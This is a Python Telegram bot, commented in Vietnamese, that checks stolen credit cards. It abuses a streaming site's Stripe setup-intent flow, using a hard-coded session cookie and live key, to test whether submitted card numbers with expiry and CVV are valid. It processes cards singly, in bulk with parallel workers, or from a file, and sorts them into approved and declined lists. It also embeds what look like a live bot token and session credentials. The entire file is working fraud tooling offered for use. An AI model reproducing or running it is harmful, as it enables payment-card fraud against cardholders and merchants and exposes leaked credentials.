import requests, re, time, asyncio
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from bs4 import BeautifulSoup

# ========== CẤU HÌNH ========== #
TELEGRAM_TOKEN = "7482122603:AAG-d2VwSvySZhKfNYpjz9HXnlduvgETYQ4"
ADMIN_ID = 5127429005
ALLOWED_USERS = {ADMIN_ID}
USER_RANKS = {ADMIN_ID: "admin"}

COOKIES = "referer=; country_code=VN; ip_address=113.172.83.44; agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F137.0.0.0+Safari%2F537.36; started_at=2025-07-04+13%3A18%3A34+%2B0400; initialized=true; pixel_session=42fa4f62-24ee-4290-b944-29a1c4b6a040; __stripe_mid=c4954d5a-d300-446d-8144-a7c65563cbac3f9142; __stripe_sid=6147f14c-a06f-420c-a782-594d676d8a2a332b9d; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3lOakV6T1RreE1GMHNJaVF5WVNReE1DUnNNVXhGUm01SFIxRktjVTFKVldRelpIaFViWEoxSWl3aU1UYzFNVFl5TURnNU5pNHhPVGd3TmpZM0lsMD0iLCJleHAiOiIyMDI1LTA3LTE4VDA5OjIxOjM2LjE5OFoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--8527b8dbcf83519531f0efb3138277bed6dca942; user_referrer=https%3A%2F%2Furbanflixtv.com%2Faccount%2Fpurchases; _uscreen2_session=Wuaaj7drKz9cEXYzN8JSMk0CyIVGH%2F5LobLcSzp2j5KpnpWRbQyfWaB9TjyiAvv625X0S9O%2BqY5gR8apPLMoTR1VJ5DCsKr6wQVREGRZDluhZDYdduMptP%2FI37guWMtI%2BfXKIAOieSuwort4XeQaZCJHecqesYujxG2vCkT62oyYFpVBKK9QTcn37B7pH5mVOCAjPzKQeZhz8zg7m9uM6SkuFbs3qTu1oVpqTDiwNj896tqiY4Do2N2PgLH9zl%2FAhABhKFpkhup3XV850HgPONukbRcge%2BqIB9xpwUPL1CfVofj2QQaQuQwjBLc55Fo2LA4ah9CUh17aJ4vAZ0tP%2B4OHlBFyoeY%2BFdIxtn8VihCWwizY%2F%2B57IB3eahWEkGGnjhcNDws382eKoiWpjIeT60ya0SjDL2SFDTw60CBs%2BiQGjaJ0WtmdiyU%3D--%2FMF2m6h5yj3XpgiU--7WSv5xuZvzz5%2FzO0g7tDLg%3D%3D"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "cookie": COOKIES
}

# ========== HÀM XỬ LÝ THẺ ========== #
async def process_card(cc, mes, ano, cvv, user_id=None):
    bin_code = cc[:6]
    start_time = time.time()
    try:
        r1 = requests.get("https://urbanflixtv.com/account/purchases/payment_methods", headers=HEADERS)
        soup = BeautifulSoup(r1.text, "html.parser")
        token_tag = soup.find("meta", {"name": "csrf-token"})
        if not token_tag:
            return "❌ Không lấy được CSRF token."

        # Retry tối đa 5 lần nếu lỗi setup_intent
        setid = ""
        for attempt in range(5):
            r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
            if r2.status_code == 200:
                try:
                    setid = r2.json().get("setup_intent", "")
                    if setid:
                        break
                except Exception:
                    pass
            time.sleep(1)
        if not setid:
            return "❌ Lỗi lấy setup_intent (sau 5 lần thử)"

        setin = setid.split("_secret_")[0]

        payload = {
            "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_year]": ano,
            "payment_method_data[card][exp_month]": mes,
            "payment_method_data[billing_details][address][country]": "VN",
            "use_stripe_sdk": "true",
            "key": "pk_live_DImPqz7QOOyx70XCA9DSifxb",
            "_stripe_account": "acct_1Cmk2bLbC5cLZDVD",
            "client_secret": setid
        }

        r3 = requests.post(f"https://api.stripe.com/v1/setup_intents/{setin}/confirm", headers=HEADERS, data=payload)
        j3 = r3.json()
        status = j3.get("status", "UNKNOWN")
        decline = j3.get("error", {}).get("decline_code", "NONE")

        bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}")
        bin_json = bin_res.json()
        card = bin_json.get("scheme", "N/A")
        type_ = bin_json.get("type", "N/A")
        brand = bin_json.get("brand", "N/A")
        alpha2 = bin_json.get("country", {}).get("alpha2", "N/A")
        bank = bin_json.get("bank", {}).get("name", "N/A")

        elapsed = round(time.time() - start_time, 2)
        return f"""
<b>✅ CHECK RESULT</b>

<b>CC:</b> {cc}|{mes}|{ano}|{cvv}
<b>Status:</b> {'✅ Approved' if status == 'succeeded' else '❌ Declined'}
<b>Decline Code:</b> {decline}

<b>Gateway:</b> Stripe
<b>Card:</b> {card.upper()}
<b>Type:</b> {type_.capitalize()}
<b>Brand:</b> {brand}
<b>Alpha2:</b> {alpha2}
<b>Bank:</b> {bank}

<b>Took:</b> {elapsed} sec
<b>Checked by:</b> mnhat [{user_id}]
"""
    except Exception as e:
        return f"❌ Lỗi xử lý: {str(e)}"

# ========== CÁC HÀM COMMAND ========== #
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Bạn không có quyền sử dụng bot.")
        return
    if not context.args:
        await update.message.reply_text("❌ Dùng: /chk cc|mes|ano|cvv")
        return
    raw = context.args[0]
    match = re.match(r'^(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', raw)
    if not match:
        await update.message.reply_text("❌ Sai cú pháp.")
        return
    await update.message.reply_text("🕐 Đang kiểm tra...")
    result = await process_card(*match.groups(), user_id)
    await update.message.reply_html(result)

async def chkall_generic(update: Update, context: ContextTypes.DEFAULT_TYPE, max_concurrent: int = 5):
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Bạn không có quyền.")
        return
    lines = update.message.text.strip().splitlines()[1:]
    await update.message.reply_text(f"🔄 Đang xử lý {len(lines)} thẻ với {max_concurrent} luồng...")
    results = []
    sem = asyncio.Semaphore(max_concurrent)
    async def worker(line):
        match = re.match(r'^(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', line.strip())
        if not match:
            results.append(f"❌ Sai cú pháp: {line}")
            return
        async with sem:
            res = await process_card(*match.groups(), user_id)
            results.append(res)
    await asyncio.gather(*(worker(line) for line in lines))
    for chunk in range(0, len(results), 30):
        await update.message.reply_html("\n".join(results[chunk:chunk+30]))

async def chkall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await chkall_generic(update, context, max_concurrent=5)

async def multi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Bạn không có quyền.")
        return
    path = "cards.txt"
    try:
        with open(path, "r", encoding="utf-8") as f:
            cards = [line.strip() for line in f if line.strip()]
    except:
        await update.message.reply_text("❌ Không tìm thấy file cards.txt")
        return
    results, approved, declined = [], [], []
    await update.message.reply_text(f"🔁 Bắt đầu kiểm tra {len(cards)} dòng...")
    sem = asyncio.Semaphore(5)
    async def worker(card):
        match = re.match(r'^(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', card)
        if not match:
            return
        async with sem:
            res = await process_card(*match.groups(), update.effective_user.id)
            if "✅ Approved" in res:
                approved.append(card)
            else:
                declined.append(card)
    await asyncio.gather(*(worker(c) for c in cards))
    with open("fileApproved.txt", "w") as f:
        f.write("\n".join(approved))
    with open("fileDecline.txt", "w") as f:
        f.write("\n".join(declined))
    await update.message.reply_document(InputFile("fileApproved.txt"))
    await update.message.reply_document(InputFile("fileDecline.txt"))

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Bạn không phải quản trị viên.")
        return
    if not context.args:
        await update.message.reply_text("Dùng: /add <user_id>")
        return
    try:
        new_id = int(context.args[0])
        ALLOWED_USERS.add(new_id)
        USER_RANKS[new_id] = "member"
        await update.message.reply_text(f"✅ Đã thêm user {new_id} với quyền member.")
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {str(e)}")

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    rank = USER_RANKS.get(user.id, "none")
    msg = f"""
👤 <b>Thông tin người dùng</b>

<b>Tên:</b> {user.full_name}
<b>ID:</b> {user.id}
<b>Rank:</b> {rank}
"""
    await update.message.reply_html(msg)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """
<b>🔊 Hướng dẫn lệnh</b>

<b>/chk</b> cc|mes|ano|cvv — Kiểm tra 1 thẻ
<b>/chkall</b> \ncc|mes|ano|cvv... — Kiểm tra nhiều thẻ (5 luồng)
<b>/chkallX</b> (X = số luồng, vd /chkall10)
<b>/multi</b> — Kiểm tra file cards.txt (tự ghi kết quả)
<b>/add</b> user_id — Thêm người dùng
<b>/info</b> — Thông tin người dùng
<b>/help</b> — Danh sách lệnh
"""
    await update.message.reply_html(msg)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """
<b>🔊 Hướng dẫn lệnh</b>

<b>/chk</b> cc|mes|ano|cvv — Kiểm tra 1 thẻ
<b>/chkall</b> \ncc|mes|ano|cvv... — Kiểm tra nhiều thẻ (5 luồng)
<b>/chkallX</b> (X = số luồng, vd /chkall10)
<b>/multi</b> — Kiểm tra file cards.txt (tự ghi kết quả)
<b>/add</b> user_id — Thêm người dùng
<b>/info</b> — Thông tin người dùng
<b>/help</b> — Danh sách lệnh
"""
    await update.message.reply_html(msg)

# ========== CHẠY BOT ========== #
if __name__ == '__main__':
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("add", add_user))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("chkall", chkall))
    app.add_handler(CommandHandler("multi", multi))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("start", start))
    for i in range(1, 21):
        app.add_handler(CommandHandler(f"chkall{i}", lambda u, c, i=i: chkall_generic(u, c, i)))
    print("✅ Bot đang chạy...")
    app.run_polling()
